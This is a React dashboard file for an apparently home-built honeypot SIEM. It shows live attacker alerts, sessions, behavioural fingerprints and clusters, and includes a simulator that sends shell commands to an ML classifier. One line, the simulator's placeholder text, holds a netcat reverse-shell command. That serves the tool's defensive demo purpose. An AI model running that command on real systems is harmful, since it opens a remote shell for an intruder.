'use client';

import React, { useState, useEffect } from 'react';

interface ThreatAlert {
    timestamp:        string;
    attacker_ip:      string;
    command:          string;
    verdict:          string;
    tactic:           string;
    technique_id:     string | null;
    confidence:       number;
    explanation:      string;
    mitigations:      string[];
    malicious_count:  number;
    is_intrusion:     boolean;
    kill_chain:       string | null;
    session_duration: number;
    identity:         IdentityInfo;
}

interface IdentityInfo {
    is_returning: boolean;
    identity_id:  string | null;
    confidence:   number;
    seen_count:   number;
}

interface SimulatorResult {
    command:      string;
    verdict:      string;
    tactic:       string;
    technique_id: string | null;
    confidence:   number;
    explanation:  string;
    mitigations:  string[];
}

interface Session {
    ip:              string;
    commands:        string[];
    tactics:         string[];
    first_seen:      number;
    last_seen:       number;
    malicious_count: number;
    kill_chain:      string;
    identity:        IdentityInfo;
}

interface AttackerIdentity {
    identity_id:  string;
    seen_count:   number;
    ips_seen:     string[];
    first_seen:   number;
    last_seen:    number;
    is_recurring: boolean;
}

interface ClusterInfo {
    cluster_id:   string;
    size:         number;
    ips:          string[];
    first_seen:   number;
    last_seen:    number;
    is_recurring: boolean;
}

interface ClusterResult {
    clusters:       ClusterInfo[];
    outliers:       { ip: string; timestamp: number }[];
    total_vectors:  number;
    total_clusters: number;
}

export default function DashboardPage() {
    const [alerts,     setAlerts]     = useState<ThreatAlert[]>([]);
    const [siemStatus, setSiemStatus] = useState<'Connecting' | 'Live' | 'Disconnected'>('Connecting');
    const [sessions,   setSessions]   = useState<Session[]>([]);
    const [identities, setIdentities] = useState<AttackerIdentity[]>([]);
    const [clusters,   setClusters]   = useState<ClusterResult | null>(null);

    const [simCommand,  setSimCommand]  = useState('');
    const [simResult,   setSimResult]   = useState<SimulatorResult | null>(null);
    const [simLoading,  setSimLoading]  = useState(false);
    const [simError,    setSimError]    = useState('');
    const [expandedMit, setExpandedMit] = useState<number | null>(null);

    useEffect(() => {
        const socket = new WebSocket('ws://127.0.0.1:8000/ws/telemetry');
        socket.onopen    = () => setSiemStatus('Live');
        socket.onmessage = (event) => {
            try {
                const data: ThreatAlert = JSON.parse(event.data);
                setAlerts(prev => [data, ...prev]);
            } catch {}
        };
        socket.onclose = () => setSiemStatus('Disconnected');
        socket.onerror = () => setSiemStatus('Disconnected');
        return () => {
            if (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING)
                socket.close();
        };
    }, []);

    useEffect(() => {
        const poll = async () => {
            try {
                const [s, f, c] = await Promise.all([
                    fetch('http://127.0.0.1:8000/sessions').then(r => r.json()),
                    fetch('http://127.0.0.1:8000/fingerprints').then(r => r.json()),
                    fetch('http://127.0.0.1:8000/clusters').then(r => r.json()),
                ]);
                setSessions(s);
                setIdentities(f);
                setClusters(c);
            } catch {}
        };
        poll();
        const interval = setInterval(poll, 3000);
        return () => clearInterval(interval);
    }, []);

    const runSimulator = async () => {
        if (!simCommand.trim()) return;
        setSimLoading(true);
        setSimResult(null);
        setSimError('');
        setExpandedMit(null);
        try {
            const res  = await fetch('http://127.0.0.1:8000/telemetry', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    command:     simCommand,
                    timestamp:   new Date().toLocaleTimeString(),
                    attacker_ip: '127.0.0.1'
                })
            });
            const data = await res.json();
            const a    = data.alert;
            setSimResult({
                command:      simCommand,
                verdict:      a?.verdict      ?? 'UNKNOWN',
                tactic:       a?.tactic       ?? 'UNKNOWN',
                technique_id: a?.technique_id ?? null,
                confidence:   a?.confidence   ?? 0,
                explanation:  a?.explanation  ?? '',
                mitigations:  a?.mitigations  ?? [],
            });
        } catch {
            setSimError('Could not reach SIEM backend. Make sure it is running on port 8000.');
        } finally {
            setSimLoading(false);
        }
    };

    const getTacticBadgeStyle = (tactic: string) => {
        const base = "px-3 py-1 rounded text-xs font-bold tracking-wider uppercase inline-block ";
        switch (tactic.toUpperCase()) {
            case 'EXECUTION':            return base + "bg-red-950 text-red-400 border border-red-800";
            case 'CREDENTIAL_ACCESS':    return base + "bg-rose-950 text-rose-400 border border-rose-800";
            case 'RECONNAISSANCE':       return base + "bg-purple-950 text-purple-400 border border-purple-800";
            case 'DISCOVERY':            return base + "bg-blue-950 text-blue-400 border border-blue-800";
            case 'EXFILTRATION':         return base + "bg-orange-950 text-orange-400 border border-orange-800";
            case 'PERSISTENCE':          return base + "bg-yellow-950 text-yellow-400 border border-yellow-800";
            case 'PRIVILEGE_ESCALATION': return base + "bg-pink-950 text-pink-400 border border-pink-800";
            case 'DEFENSE_EVASION':      return base + "bg-indigo-950 text-indigo-400 border border-indigo-800";
            case 'STEALTH':              return base + "bg-indigo-950 text-indigo-400 border border-indigo-800";
            case 'IMPACT':               return base + "bg-red-950 text-red-400 border border-red-800";
            case 'BENIGN':               return base + "bg-emerald-950 text-emerald-400 border border-emerald-800";
            default:                     return base + "bg-zinc-800 text-zinc-400 border border-zinc-700";
        }
    };

    return (
        <div className="min-h-screen bg-zinc-950 text-zinc-100 p-8 font-sans">
            <header className="border-b border-zinc-800 pb-6 mb-8 flex justify-between items-center">
                <div>
                    <h1 className="text-2xl font-black tracking-tight text-white">AGENTIC DECEPTION PLATFORM</h1>
                    <p className="text-zinc-500 text-sm mt-1">Real-time Autonomous Honeypot Telemetry Classifier</p>
                </div>
                <div className="flex items-center gap-3">
                    <a
                        href="http://127.0.0.1:8000/report"
                        target="_blank"
                        rel="noopener noreferrer"
                        className="flex items-center gap-2 px-4 py-2 bg-zinc-800 hover:bg-zinc-700 border border-zinc-700 rounded-lg text-xs font-bold text-zinc-200 tracking-wider uppercase transition-colors"
                    >
                        ↓ Export Report
                    </a>
                    <div className="flex items-center gap-3 bg-zinc-900 border border-zinc-800 px-4 py-2 rounded-lg">
                        <span className="text-xs font-semibold uppercase text-zinc-400 tracking-wide">SIEM Status:</span>
                        <div className="flex items-center gap-2">
                            <span className={`w-2 h-2 rounded-full ${
                                siemStatus === 'Live'       ? 'bg-emerald-500 animate-pulse' :
                                siemStatus === 'Connecting' ? 'bg-amber-500 animate-pulse'   : 'bg-rose-500'
                            }`} />
                            <span className={`text-xs font-bold ${
                                siemStatus === 'Live'       ? 'text-emerald-400' :
                                siemStatus === 'Connecting' ? 'text-amber-400'   : 'text-rose-400'
                            }`}>{siemStatus}</span>
                        </div>
                    </div>
                </div>
            </header>

            <main className="space-y-8">
                <div className="bg-zinc-900/50 border border-zinc-800/80 rounded-xl overflow-hidden backdrop-blur-sm shadow-xl">
                    <div className="border-b border-zinc-800 bg-zinc-900/80 px-6 py-4 flex items-center gap-3">
                        <span className="w-2 h-2 rounded-full bg-emerald-500" />
                        <h2 className="text-sm font-bold tracking-wider text-zinc-300 uppercase">Command Threat Simulator</h2>
                        <span className="text-xs text-zinc-600 ml-auto">Analyse any shell command against the ML engine</span>
                    </div>
                    <div className="p-6 space-y-4">
                        <div className="flex gap-3">
                            <div className="flex-1 flex items-center bg-zinc-950 border border-zinc-700 rounded-lg px-4 gap-2 focus-within:border-zinc-500 transition-colors">
                                <span className="text-emerald-500 font-mono text-sm select-none">$</span>
                                <input
                                    type="text"
                                    value={simCommand}
                                    onChange={(e) => setSimCommand(e.target.value)}
                                    onKeyDown={(e) => e.key === 'Enter' && runSimulator()}
                                    placeholder="nc -e /bin/bash 192.168.1.1 4444"
                                    className="flex-1 bg-transparent text-emerald-400 font-mono text-sm py-3 outline-none placeholder:text-zinc-700"
                                />
                            </div>
                            <button
                                onClick={runSimulator}
                                disabled={simLoading || !simCommand.trim()}
                                className="px-6 py-3 bg-zinc-800 hover:bg-zinc-700 disabled:opacity-40 disabled:cursor-not-allowed border border-zinc-700 rounded-lg text-sm font-bold text-zinc-200 tracking-wider uppercase transition-colors"
                            >
                                {simLoading ? 'Analysing...' : 'Analyse'}
                            </button>
                        </div>

                        {simError && <p className="text-rose-400 text-xs font-mono">{simError}</p>}

                        {simResult && (
                            <div className={`rounded-lg border p-5 space-y-4 ${
                                simResult.verdict === 'BENIGN'
                                    ? 'bg-emerald-950/30 border-emerald-800/50'
                                    : 'bg-red-950/30 border-red-800/50'
                            }`}>
                                <div className="flex items-center justify-between">
                                    <div className="flex items-center gap-3">
                                        <span className={`text-lg font-black tracking-widest ${
                                            simResult.verdict === 'BENIGN' ? 'text-emerald-400' : 'text-red-400'
                                        }`}>
                                            {simResult.verdict === 'BENIGN' ? '✓ BENIGN' : '⚠ MALICIOUS'}
                                        </span>
                                        <span className={getTacticBadgeStyle(simResult.tactic)}>{simResult.tactic.replace(/_/g, ' ')}</span>
                                        {simResult.technique_id && (
                                            <a
                                                href={`https://attack.mitre.org/techniques/${simResult.technique_id.replace('.', '/')}`}
                                                target="_blank"
                                                rel="noopener noreferrer"
                                                className="px-3 py-1 rounded text-xs font-bold tracking-wider uppercase bg-zinc-800 text-zinc-300 border border-zinc-700 hover:border-zinc-500 transition-colors"
                                            >
                                                {simResult.technique_id} ↗
                                            </a>
                                        )}
                                    </div>
                                    <span className={`text-2xl font-black ${
                                        simResult.confidence >= 90 ? 'text-rose-400' :
                                        simResult.confidence >= 75 ? 'text-amber-400' : 'text-zinc-400'
                                    }`}>
                                        {simResult.confidence}%
                                    </span>
                                </div>

                                {simResult.explanation && (
                                    <div className="space-y-1">
                                        <p className="text-xs font-bold uppercase tracking-wider text-zinc-500">Explanation</p>
                                        <p className="text-sm text-zinc-300 leading-relaxed">{simResult.explanation}</p>
                                    </div>
                                )}

                                {simResult.mitigations.length > 0 && (
                                    <div className="space-y-2">
                                        <p className="text-xs font-bold uppercase tracking-wider text-zinc-500">MITRE Mitigations</p>
                                        <div className="space-y-2">
                                            {simResult.mitigations.map((m, i) => (
                                                <div key={i} className="bg-zinc-900 border border-zinc-800 rounded-lg overflow-hidden">
                                                    <button
                                                        onClick={() => setExpandedMit(expandedMit === i ? null : i)}
                                                        className="w-full flex items-center justify-between px-4 py-3 text-left hover:bg-zinc-800/50 transition-colors"
                                                    >
                                                        <span className="text-xs font-semibold text-zinc-300">
                                                            {m.split(' ').slice(0, 6).join(' ')}...
                                                        </span>
                                                        <span className="text-zinc-600 text-xs ml-4 shrink-0">
                                                            {expandedMit === i ? '▲ collapse' : '▼ expand'}
                                                        </span>
                                                    </button>
                                                    {expandedMit === i && (
                                                        <div className="px-4 pb-4 text-xs text-zinc-400 leading-relaxed border-t border-zinc-800 pt-3 whitespace-pre-wrap">
                                                            {m}
                                                        </div>
                                                    )}
                                                </div>
                                            ))}
                                        </div>
                                    </div>
                                )}
                            </div>
                        )}
                    </div>
                </div>

                {alerts.some(a => a.is_intrusion) && (
                    <div className="bg-red-950/40 border border-red-800 rounded-xl px-6 py-4 flex items-start gap-4">
                        <span className="text-red-400 text-xl mt-0.5">🚨</span>
                        <div className="space-y-2 flex-1">
                            <p className="text-red-400 font-black uppercase tracking-wider text-sm">
                                Active Intrusion Sessions Detected
                            </p>
                            {Array.from(
                                new Map(
                                    alerts.filter(a => a.is_intrusion)
                                          .map(a => [a.attacker_ip, a])
                                ).values()
                            ).map((a, i) => (
                                <div key={i} className="flex items-center gap-4 text-xs flex-wrap">
                                    <span className="text-zinc-300 font-mono font-bold">{a.attacker_ip}</span>
                                    <span className="text-zinc-500">{a.malicious_count} malicious commands</span>
                                    {a.kill_chain && <span className="text-red-300 font-mono">{a.kill_chain}</span>}
                                    <span className="text-zinc-600">{a.session_duration}s session</span>
                                    {a.identity?.is_returning && (
                                        <span className="px-2 py-0.5 rounded text-xs font-bold bg-violet-950 text-violet-400 border border-violet-800">
                                            ⟳ Returning — {a.identity.confidence}%
                                        </span>
                                    )}
                                </div>
                            ))}
                        </div>
                    </div>
                )}

                {identities.length > 0 && (
                    <div className="bg-zinc-900/50 border border-zinc-800/80 rounded-xl overflow-hidden backdrop-blur-sm shadow-xl">
                        <div className="border-b border-zinc-800 bg-zinc-900/80 px-6 py-4 flex items-center gap-3">
                            <span className="w-2 h-2 rounded-full bg-violet-500" />
                            <h2 className="text-sm font-bold tracking-wider text-zinc-300 uppercase">Attacker Behavioral Fingerprints</h2>
                            <span className="text-xs text-zinc-600 ml-auto">
                                BERT semantic embeddings · {identities.length} unique identit{identities.length > 1 ? 'ies' : 'y'}
                            </span>
                        </div>
                        <div className="divide-y divide-zinc-800/60">
                            {identities.map((identity, i) => (
                                <div key={i} className="px-6 py-4 flex items-center justify-between hover:bg-zinc-900/40 transition-colors">
                                    <div className="flex items-center gap-4">
                                        <div className="w-10 h-10 rounded-lg bg-violet-950 border border-violet-800 flex items-center justify-center">
                                            <span className="text-violet-400 text-xs font-black">{identity.identity_id.slice(0, 2).toUpperCase()}</span>
                                        </div>
                                        <div className="space-y-1">
                                            <div className="flex items-center gap-2">
                                                <span className="font-mono text-xs text-zinc-300 font-bold">{identity.identity_id}</span>
                                                {identity.is_recurring && (
                                                    <span className="px-2 py-0.5 rounded text-xs font-bold bg-violet-950 text-violet-400 border border-violet-800 uppercase tracking-wider">
                                                        ⟳ Returning Attacker
                                                    </span>
                                                )}
                                            </div>
                                            <div className="flex items-center gap-3 text-xs text-zinc-500">
                                                <span>IPs: {identity.ips_seen.join(', ')}</span>
                                                <span>·</span>
                                                <span>First: {new Date(identity.first_seen * 1000).toLocaleTimeString()}</span>
                                                <span>·</span>
                                                <span>Last: {new Date(identity.last_seen * 1000).toLocaleTimeString()}</span>
                                            </div>
                                        </div>
                                    </div>
                                    <div className="text-right">
                                        <p className={`text-2xl font-black ${
                                            identity.seen_count >= 3 ? 'text-red-400' :
                                            identity.seen_count >= 2 ? 'text-amber-400' : 'text-zinc-400'
                                        }`}>
                                            {identity.seen_count}x
                                        </p>
                                        <p className="text-xs text-zinc-600">sessions</p>
                                    </div>
                                </div>
                            ))}
                        </div>
                    </div>
                )}

                {clusters && clusters.total_clusters > 0 && (
                    <div className="bg-zinc-900/50 border border-zinc-800/80 rounded-xl overflow-hidden backdrop-blur-sm shadow-xl">
                        <div className="border-b border-zinc-800 bg-zinc-900/80 px-6 py-4 flex items-center gap-3">
                            <span className="w-2 h-2 rounded-full bg-cyan-500" />
                            <h2 className="text-sm font-bold tracking-wider text-zinc-300 uppercase">Behavioral Clusters</h2>
                            <span className="text-xs text-zinc-600 ml-auto">
                                {clusters.total_clusters} cluster{clusters.total_clusters > 1 ? 's' : ''} · {clusters.total_vectors} sessions · {clusters.outliers.length} outliers
                            </span>
                        </div>
                        <div className="p-6 space-y-3">
                            {clusters.clusters.map((cluster, i) => (
                                <div key={i} className="bg-zinc-950 border border-zinc-800 rounded-lg px-5 py-4 flex items-center justify-between">
                                    <div className="flex items-center gap-4">
                                        <div className="w-10 h-10 rounded-lg bg-cyan-950 border border-cyan-800 flex items-center justify-center">
                                            <span className="text-cyan-400 text-xs font-black">{cluster.cluster_id.split('_')[1]}</span>
                                        </div>
                                        <div className="space-y-1">
                                            <div className="flex items-center gap-2">
                                                <span className="text-xs font-bold text-zinc-300 uppercase tracking-wider">{cluster.cluster_id}</span>
                                                {cluster.is_recurring && (
                                                    <span className="px-2 py-0.5 rounded text-xs font-bold bg-cyan-950 text-cyan-400 border border-cyan-800 uppercase tracking-wider">Multi-IP</span>
                                                )}
                                            </div>
                                            <div className="flex items-center gap-3 text-xs text-zinc-500">
                                                <span>IPs: {cluster.ips.join(', ')}</span>
                                                <span>·</span>
                                                <span>{new Date(cluster.first_seen * 1000).toLocaleTimeString()} — {new Date(cluster.last_seen * 1000).toLocaleTimeString()}</span>
                                            </div>
                                        </div>
                                    </div>
                                    <div className="text-right">
                                        <p className={`text-2xl font-black ${
                                            cluster.size >= 3 ? 'text-red-400' :
                                            cluster.size >= 2 ? 'text-amber-400' : 'text-zinc-400'
                                        }`}>{cluster.size}</p>
                                        <p className="text-xs text-zinc-600">sessions</p>
                                    </div>
                                </div>
                            ))}
                            {clusters.outliers.length > 0 && (
                                <div className="bg-zinc-950 border border-zinc-800 rounded-lg px-5 py-3 flex items-center justify-between">
                                    <div className="flex items-center gap-3">
                                        <span className="text-xs font-bold text-zinc-500 uppercase tracking-wider">Outliers — unique attack patterns</span>
                                        <span className="text-xs text-zinc-600">{clusters.outliers.map(o => o.ip).join(', ')}</span>
                                    </div>
                                    <span className="text-zinc-500 font-bold">{clusters.outliers.length}</span>
                                </div>
                            )}
                        </div>
                    </div>
                )}

                {sessions.length > 0 && (
                    <div className="bg-zinc-900/50 border border-zinc-800/80 rounded-xl overflow-hidden backdrop-blur-sm shadow-xl">
                        <div className="border-b border-zinc-800 bg-zinc-900/80 px-6 py-4 flex items-center gap-3">
                            <span className="w-2 h-2 rounded-full bg-amber-500" />
                            <h2 className="text-sm font-bold tracking-wider text-zinc-300 uppercase">Attack Session Timeline</h2>
                            <span className="text-xs text-zinc-600 ml-auto">{sessions.length} active session{sessions.length > 1 ? 's' : ''}</span>
                        </div>
                        <div className="p-6 space-y-6">
                            {sessions.map((session, i) => (
                                <div key={`${session.ip}-${i}`} className="space-y-3">
                                    <div className="flex items-center justify-between">
                                        <div className="flex items-center gap-3 flex-wrap">
                                            <span className="font-mono font-bold text-zinc-200 text-sm">{session.ip}</span>
                                            <span className="text-xs text-zinc-500">{session.malicious_count} malicious command{session.malicious_count > 1 ? 's' : ''}</span>
                                            <span className={`text-xs font-bold px-2 py-0.5 rounded border ${
                                                session.malicious_count >= 3
                                                    ? 'bg-red-950 text-red-400 border-red-800'
                                                    : 'bg-amber-950 text-amber-400 border-amber-800'
                                            }`}>
                                                {session.malicious_count >= 3 ? 'ACTIVE INTRUSION' : 'SUSPICIOUS'}
                                            </span>
                                            {session.identity?.is_returning && (
                                                <span className="px-2 py-0.5 rounded text-xs font-bold bg-violet-950 text-violet-400 border border-violet-800">
                                                    ⟳ {session.identity.confidence}% match
                                                </span>
                                            )}
                                        </div>
                                        <span className="text-xs text-zinc-600 font-mono">
                                            {new Date(session.first_seen * 1000).toLocaleTimeString()} — {new Date(session.last_seen * 1000).toLocaleTimeString()}
                                        </span>
                                    </div>
                                    <div className="flex items-center gap-2 flex-wrap">
                                        {Array.from(new Set(session.tactics)).map((tactic, j, arr) => (
                                            <React.Fragment key={`${session.ip}-${tactic}-${j}`}>
                                                <span className={getTacticBadgeStyle(tactic)}>{tactic.replace(/_/g, ' ')}</span>
                                                {j < arr.length - 1 && <span className="text-zinc-600 text-sm">→</span>}
                                            </React.Fragment>
                                        ))}
                                    </div>
                                    <div className="space-y-1 pl-2 border-l-2 border-zinc-800">
                                        {session.commands.map((cmd, j) => (
                                            <div key={`${session.ip}-cmd-${j}`} className="flex items-center gap-3">
                                                <span className="text-zinc-700 text-xs select-none">{String(j + 1).padStart(2, '0')}</span>
                                                <span className={getTacticBadgeStyle(session.tactics[j] ?? 'UNKNOWN')}>
                                                    {(session.tactics[j] ?? 'UNKNOWN').replace(/_/g, ' ')}
                                                </span>
                                                <span className="font-mono text-xs text-emerald-400 bg-zinc-950 px-2 py-0.5 rounded border border-zinc-800">
                                                    {cmd}
                                                </span>
                                            </div>
                                        ))}
                                    </div>
                                    {i < sessions.length - 1 && <div className="border-b border-zinc-800/50 pt-2" />}
                                </div>
                            ))}
                        </div>
                    </div>
                )}

                <div className="bg-zinc-900/50 border border-zinc-800/80 rounded-xl overflow-hidden backdrop-blur-sm shadow-xl">
                    <div className="border-b border-zinc-800 bg-zinc-900/80 px-6 py-4">
                        <h2 className="text-sm font-bold tracking-wider text-zinc-300 uppercase">Live Aggregated Threat Stream</h2>
                    </div>
                    <div className="overflow-x-auto">
                        <table className="w-full text-left border-collapse">
                            <thead>
                                <tr className="border-b border-zinc-800 bg-zinc-950/40 text-zinc-400 font-bold text-xs uppercase tracking-wider">
                                    <th className="px-6 py-4 w-28">Timestamp</th>
                                    <th className="px-6 py-4 w-36">Attacker IP</th>
                                    <th className="px-6 py-4">Intercepted Payload</th>
                                    <th className="px-6 py-4 w-52">Tactic</th>
                                    <th className="px-6 py-4 w-28">Technique</th>
                                    <th className="px-6 py-4">Kill Chain</th>
                                    <th className="px-6 py-4 w-32 text-right">Confidence</th>
                                </tr>
                            </thead>
                            <tbody className="divide-y divide-zinc-800/60 font-mono text-sm">
                                {alerts.length === 0 ? (
                                    <tr>
                                        <td colSpan={7} className="px-6 py-12 text-center text-zinc-600 italic">
                                            No inbound telemetry signatures identified yet. Awaiting network interactions on port :8022...
                                        </td>
                                    </tr>
                                ) : (
                                    alerts.map((alert, index) => (
                                        <tr key={index} className="hover:bg-zinc-900/40 transition-colors duration-150 group">
                                            <td className="px-6 py-4 text-zinc-500">{alert.timestamp}</td>
                                            <td className="px-6 py-4 font-semibold text-zinc-300">{alert.attacker_ip}</td>
                                            <td className="px-6 py-4">
                                                <span className="bg-zinc-950 text-emerald-400 px-2.5 py-1 rounded border border-zinc-800 block font-medium overflow-x-auto whitespace-pre group-hover:border-zinc-700 transition-colors">
                                                    {alert.command}
                                                </span>
                                            </td>
                                            <td className="px-6 py-4">
                                                <span className={getTacticBadgeStyle(alert.tactic)}>{alert.tactic.replace(/_/g, ' ')}</span>
                                            </td>
                                            <td className="px-6 py-4 text-zinc-400 text-xs">{alert.technique_id ?? '—'}</td>
                                            <td className="px-6 py-4 text-zinc-500 text-xs font-mono">{alert.kill_chain ?? '—'}</td>
                                            <td className="px-6 py-4 text-right font-bold">
                                                <span className={`${
                                                    alert.confidence >= 90 ? 'text-rose-400' :
                                                    alert.confidence >= 75 ? 'text-amber-400' : 'text-zinc-400'
                                                }`}>{alert.confidence}%</span>
                                            </td>
                                        </tr>
                                    ))
                                )}
                            </tbody>
                        </table>
                    </div>
                </div>
            </main>
        </div>
    );
}
